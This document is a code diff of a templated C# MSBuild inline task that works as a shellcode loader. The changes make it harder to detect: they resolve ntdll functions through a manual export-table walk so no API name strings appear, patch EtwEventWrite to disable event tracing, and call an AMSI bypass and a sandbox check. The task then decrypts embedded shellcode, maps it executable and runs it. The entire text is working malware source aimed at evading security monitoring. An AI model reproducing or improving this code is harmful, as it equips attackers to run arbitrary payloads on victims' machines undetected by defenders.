@@ -26,13 +26,41 @@
         using Microsoft.Build.Utilities;
 
         public class {{ v.task_name }} : Task, ITask {
-            [DllImport("kernel32")] static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);
-            [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint old);
+
+            // Dynamic NtDll delegates — no DllImport strings in assembly metadata
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate int NtAllocFn(IntPtr ph, ref IntPtr ba, IntPtr zb, ref IntPtr rs, uint at, uint prot);
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate int NtProtFn(IntPtr ph, ref IntPtr ba, ref IntPtr sz, uint np, out uint op);
 
             static string B(int[] c) {
                 var sb = new System.Text.StringBuilder();
                 foreach (var x in c) sb.Append((char)x);
                 return sb.ToString();
+            }
+
+            // Walk PE export table by name bytes — no plaintext function name strings.
+            static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
+                try {
+                    int peo    = Marshal.ReadInt32(mod, 0x3C);
+                    int exprva = Marshal.ReadInt32(IntPtr.Add(mod, peo + 0x88));
+                    if (exprva == 0) return IntPtr.Zero;
+                    IntPtr ed  = IntPtr.Add(mod, exprva);
+                    int nn   = Marshal.ReadInt32(ed, 0x18);
+                    int nrva = Marshal.ReadInt32(ed, 0x20);
+                    int orva = Marshal.ReadInt32(ed, 0x24);
+                    int frva = Marshal.ReadInt32(ed, 0x1C);
+                    for (int i = 0; i < nn; i++) {
+                        IntPtr np = IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, nrva + i*4)));
+                        bool ok = true;
+                        for (int j = 0; j < name.Length; j++)
+                            if (Marshal.ReadByte(IntPtr.Add(np, j)) != name[j]) { ok = false; break; }
+                        if (!ok) continue;
+                        short ord = Marshal.ReadInt16(IntPtr.Add(mod, orva + i*2));
+                        return IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, frva + ord*4)));
+                    }
+                } catch {}
+                return IntPtr.Zero;
             }
 
             static void {{ v.fn_amsi }}() {
@@ -46,39 +74,25 @@
                 } catch {}
             }
 
-            static void {{ v.fn_etw }}() {
+            static void {{ v.fn_etw }}(IntPtr ntdll) {
                 try {
-                    IntPtr ntdll = IntPtr.Zero;
-                    foreach (System.Diagnostics.ProcessModule m in
-                             System.Diagnostics.Process.GetCurrentProcess().Modules)
-                        if (m.ModuleName.ToLower() == B(new int[]{110,116,100,108,108,46,100,108,108})) {
-                            ntdll = m.BaseAddress; break;
-                        }
-                    if (ntdll == IntPtr.Zero) return;
-                    int peo    = Marshal.ReadInt32(ntdll, 0x3C);
-                    int exprva = Marshal.ReadInt32(IntPtr.Add(ntdll, peo + 0x88));
-                    if (exprva == 0) return;
-                    IntPtr ed  = IntPtr.Add(ntdll, exprva);
-                    int nn     = Marshal.ReadInt32(ed, 0x18);
-                    int nrva   = Marshal.ReadInt32(ed, 0x20);
-                    int orva   = Marshal.ReadInt32(ed, 0x24);
-                    int frva   = Marshal.ReadInt32(ed, 0x1C);
+                    // EtwEventWrite byte sequence (no plaintext string)
                     byte[] tgt = new byte[]{69,116,119,69,118,101,110,116,87,114,105,116,101,0};
-                    for (int i = 0; i < nn; i++) {
-                        IntPtr np = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, nrva + i*4)));
-                        bool ok = true;
-                        for (int j = 0; j < tgt.Length; j++)
-                            if (Marshal.ReadByte(IntPtr.Add(np, j)) != tgt[j]) { ok = false; break; }
-                        if (!ok) continue;
-                        short ord = Marshal.ReadInt16(IntPtr.Add(ntdll, orva + i*2));
-                        IntPtr fn = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, frva + ord*4)));
-                        uint old; VirtualProtect(fn, 3, 0x40, out old);
-                        Marshal.WriteByte(fn, 0, 0x33);
-                        Marshal.WriteByte(fn, 1, 0xC0);
-                        Marshal.WriteByte(fn, 2, 0xC3);
-                        VirtualProtect(fn, 3, old, out old);
-                        break;
-                    }
+                    IntPtr fn  = {{ v.fn_getexport }}(ntdll, tgt);
+                    if (fn == IntPtr.Zero) return;
+                    // NtProtectVirtualMemory byte sequence
+                    byte[] protN = new byte[]{78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
+                    IntPtr protAddr = {{ v.fn_getexport }}(ntdll, protN);
+                    if (protAddr == IntPtr.Zero) return;
+                    var NtProt = (NtProtFn)Marshal.GetDelegateForFunctionPointer(protAddr, typeof(NtProtFn));
+                    IntPtr ph = (IntPtr)(-1);
+                    IntPtr ba = fn; IntPtr sz = (IntPtr)3; uint old;
+                    NtProt(ph, ref ba, ref sz, 0x40, out old);
+                    Marshal.WriteByte(fn, 0, 0x33);
+                    Marshal.WriteByte(fn, 1, 0xC0);
+                    Marshal.WriteByte(fn, 2, 0xC3);
+                    IntPtr ba2 = fn; IntPtr sz2 = (IntPtr)3;
+                    NtProt(ph, ref ba2, ref sz2, old, out old);
                 } catch {}
             }
 
@@ -113,26 +127,50 @@
 
             public override bool Execute() {
                 if ({{ v.fn_sandbox }}()) return false;
+
+                // Resolve ntdll from loaded modules (no GetModuleHandle string in IAT)
+                IntPtr ntdll = IntPtr.Zero;
+                foreach (System.Diagnostics.ProcessModule m in
+                         System.Diagnostics.Process.GetCurrentProcess().Modules)
+                    if (m.ModuleName.ToLower() == B(new int[]{110,116,100,108,108,46,100,108,108})) {
+                        ntdll = m.BaseAddress; break;
+                    }
+                if (ntdll == IntPtr.Zero) return false;
+
                 {{ v.fn_amsi }}();
-                {{ v.fn_etw }}();
+                {{ v.fn_etw }}(ntdll);
                 Thread.Sleep(2000 + new Random().Next(3000));
 
                 byte[] _k = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
                 for (int _ki = 0; _ki < _k.Length; _ki++) _k[_ki] ^= (byte){{ key_tweak }};
                 byte[] sc = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
 
-                IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
-                Marshal.Copy(sc, 0, mem, sc.Length);
-                uint old;
-                VirtualProtect(mem, (uint)sc.Length, 0x20, out old);
+                // NtAllocateVirtualMemory + NtProtectVirtualMemory — no kernel32 IAT entries
+                byte[] allocN = new byte[]{78,116,65,108,108,111,99,97,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
+                byte[] protN  = new byte[]{78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
+                IntPtr allocAddr = {{ v.fn_getexport }}(ntdll, allocN);
+                IntPtr protAddr  = {{ v.fn_getexport }}(ntdll, protN);
+                if (allocAddr == IntPtr.Zero || protAddr == IntPtr.Zero) return false;
 
-                var t = new Thread(() => {
+                var NtAlloc = (NtAllocFn)Marshal.GetDelegateForFunctionPointer(allocAddr, typeof(NtAllocFn));
+                var NtProt  = (NtProtFn )Marshal.GetDelegateForFunctionPointer(protAddr,  typeof(NtProtFn));
+
+                IntPtr ph  = (IntPtr)(-1);
+                IntPtr mem = IntPtr.Zero;
+                IntPtr rsz = (IntPtr)sc.Length;
+                if (NtAlloc(ph, ref mem, IntPtr.Zero, ref rsz, 0x3000, 0x04) != 0 || mem == IntPtr.Zero) return false;
+                Marshal.Copy(sc, 0, mem, sc.Length);
+                IntPtr psz = (IntPtr)sc.Length;
+                uint oldProt;
+                NtProt(ph, ref mem, ref psz, 0x20, out oldProt);
+
+                var fn_thread = new Thread(() => {
                     var fn = (Action)Marshal.GetDelegateForFunctionPointer(mem, typeof(Action));
                     fn();
                 });
-                t.IsBackground = true;
-                t.Start();
-                t.Join();
+                fn_thread.IsBackground = true;
+                fn_thread.Start();
+                fn_thread.Join();
                 return true;
             }
         }
